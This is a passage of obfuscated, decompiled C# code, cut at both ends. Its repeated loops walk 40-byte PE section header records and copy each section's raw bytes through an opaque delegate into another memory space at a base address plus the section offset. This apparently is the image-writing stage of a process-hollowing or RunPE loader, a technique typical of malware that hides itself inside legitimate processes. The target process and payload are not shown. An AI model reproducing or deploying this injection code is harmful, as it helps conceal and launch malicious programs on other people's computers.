					}
					((byte*)ptr)[4042] = ((*(int*)((byte*)ptr + 1780) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4042] != 0)
					{
						byte[] array147;
						checked
						{
							array147 = new byte[*unchecked((int*)((byte*)ptr + 1780)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1784), array147, 0, array147.Length);
						((byte*)ptr)[4043] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1776))), array147, array147.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4043] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4047] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4047] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1788)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1792)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1796)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4045] = ((*(int*)((byte*)ptr + 1792) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4045] != 0)
					{
						byte[] array148;
						checked
						{
							array148 = new byte[*unchecked((int*)((byte*)ptr + 1792)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1796), array148, 0, array148.Length);
						((byte*)ptr)[4046] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1788))), array148, array148.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4046] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4050] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4050] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1800)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1804)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1808)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4048] = ((*(int*)((byte*)ptr + 1804) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4048] != 0)
					{
						byte[] array149;
						checked
						{
							array149 = new byte[*unchecked((int*)((byte*)ptr + 1804)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1808), array149, 0, array149.Length);
						((byte*)ptr)[4049] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1800))), array149, array149.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4049] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4053] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4053] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1812)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1816)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1820)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4051] = ((*(int*)((byte*)ptr + 1816) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4051] != 0)
					{
						byte[] array150;
						checked
						{
							array150 = new byte[*unchecked((int*)((byte*)ptr + 1816)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1820), array150, 0, array150.Length);
						((byte*)ptr)[4052] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1812))), array150, array150.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4052] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4056] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4056] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1824)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1828)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1832)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4054] = ((*(int*)((byte*)ptr + 1828) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4054] != 0)
					{
						byte[] array151;
						checked
						{
							array151 = new byte[*unchecked((int*)((byte*)ptr + 1828)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1832), array151, 0, array151.Length);
						((byte*)ptr)[4055] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1824))), array151, array151.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4055] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4059] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4059] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1836)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1840)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1844)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4057] = ((*(int*)((byte*)ptr + 1840) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4057] != 0)
					{
						byte[] array152;
						checked
						{
							array152 = new byte[*unchecked((int*)((byte*)ptr + 1840)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1844), array152, 0, array152.Length);
						((byte*)ptr)[4058] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1836))), array152, array152.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4058] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4062] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4062] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1848)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1852)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1856)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4060] = ((*(int*)((byte*)ptr + 1852) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4060] != 0)
					{
						byte[] array153;
						checked
						{
							array153 = new byte[*unchecked((int*)((byte*)ptr + 1852)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1856), array153, 0, array153.Length);
						((byte*)ptr)[4061] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1848))), array153, array153.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4061] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4065] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4065] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1860)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1864)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1868)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4063] = ((*(int*)((byte*)ptr + 1864) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4063] != 0)
					{
						byte[] array154;
						checked
						{
							array154 = new byte[*unchecked((int*)((byte*)ptr + 1864)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1868), array154, 0, array154.Length);
						((byte*)ptr)[4064] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1860))), array154, array154.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4064] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4068] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4068] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1872)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1876)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1880)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4066] = ((*(int*)((byte*)ptr + 1876) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4066] != 0)
					{
						byte[] array155;
						checked
						{
							array155 = new byte[*unchecked((int*)((byte*)ptr + 1876)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1880), array155, 0, array155.Length);
						((byte*)ptr)[4067] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1872))), array155, array155.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4067] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4071] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4071] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1884)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1888)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1892)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4069] = ((*(int*)((byte*)ptr + 1888) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4069] != 0)
					{
						byte[] array156;
						checked
						{
							array156 = new byte[*unchecked((int*)((byte*)ptr + 1888)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1892), array156, 0, array156.Length);
						((byte*)ptr)[4070] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1884))), array156, array156.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4070] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4074] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4074] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1896)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1900)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1904)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4072] = ((*(int*)((byte*)ptr + 1900) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4072] != 0)
					{
						byte[] array157;
						checked
						{
							array157 = new byte[*unchecked((int*)((byte*)ptr + 1900)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1904), array157, 0, array157.Length);
						((byte*)ptr)[4073] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1896))), array157, array157.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4073] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4077] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4077] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1908)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1912)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1916)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4075] = ((*(int*)((byte*)ptr + 1912) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4075] != 0)
					{
						byte[] array158;
						checked
						{
							array158 = new byte[*unchecked((int*)((byte*)ptr + 1912)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1916), array158, 0, array158.Length);
						((byte*)ptr)[4076] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1908))), array158, array158.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4076] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4080] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4080] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1920)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1924)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1928)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4078] = ((*(int*)((byte*)ptr + 1924) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4078] != 0)
					{
						byte[] array159;
						checked
						{
							array159 = new byte[*unchecked((int*)((byte*)ptr + 1924)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1928), array159, 0, array159.Length);
						((byte*)ptr)[4079] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1920))), array159, array159.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4079] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4083] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4083] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1932)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1936)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1940)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4081] = ((*(int*)((byte*)ptr + 1936) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4081] != 0)
					{
						byte[] array160;
						checked
						{
							array160 = new byte[*unchecked((int*)((byte*)ptr + 1936)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1940), array160, 0, array160.Length);
						((byte*)ptr)[4082] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1932))), array160, array160.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4082] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4086] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4086] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1944)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1948)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1952)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4084] = ((*(int*)((byte*)ptr + 1948) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4084] != 0)
					{
						byte[] array161;
						checked
						{
							array161 = new byte[*unchecked((int*)((byte*)ptr + 1948)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1952), array161, 0, array161.Length);
						((byte*)ptr)[4085] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1944))), array161, array161.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4085] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4089] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4089] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1956)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1960)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1964)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4087] = ((*(int*)((byte*)ptr + 1960) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4087] != 0)
					{
						byte[] array162;
						checked
						{
							array162 = new byte[*unchecked((int*)((byte*)ptr + 1960)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1964), array162, 0, array162.Length);
						((byte*)ptr)[4088] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1956))), array162, array162.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4088] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4092] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4092] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1968)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1972)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1976)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4090] = ((*(int*)((byte*)ptr + 1972) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4090] != 0)
					{
						byte[] array163;
						checked
						{
							array163 = new byte[*unchecked((int*)((byte*)ptr + 1972)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1976), array163, 0, array163.Length);
						((byte*)ptr)[4091] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1968))), array163, array163.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4091] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4095] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4095] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1980)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1984)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1988)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4093] = ((*(int*)((byte*)ptr + 1984) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4093] != 0)
					{
						byte[] array164;
						checked
						{
							array164 = new byte[*unchecked((int*)((byte*)ptr + 1984)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1988), array164, 0, array164.Length);
						((byte*)ptr)[4094] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1980))), array164, array164.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4094] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4098] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4098] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1992)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1996)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2000)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4096] = ((*(int*)((byte*)ptr + 1996) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4096] != 0)
					{
						byte[] array165;
						checked
						{
							array165 = new byte[*unchecked((int*)((byte*)ptr + 1996)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2000), array165, 0, array165.Length);
						((byte*)ptr)[4097] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1992))), array165, array165.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4097] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4101] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4101] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2004)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2008)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2012)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4099] = ((*(int*)((byte*)ptr + 2008) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4099] != 0)
					{
						byte[] array166;
						checked
						{
							array166 = new byte[*unchecked((int*)((byte*)ptr + 2008)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2012), array166, 0, array166.Length);
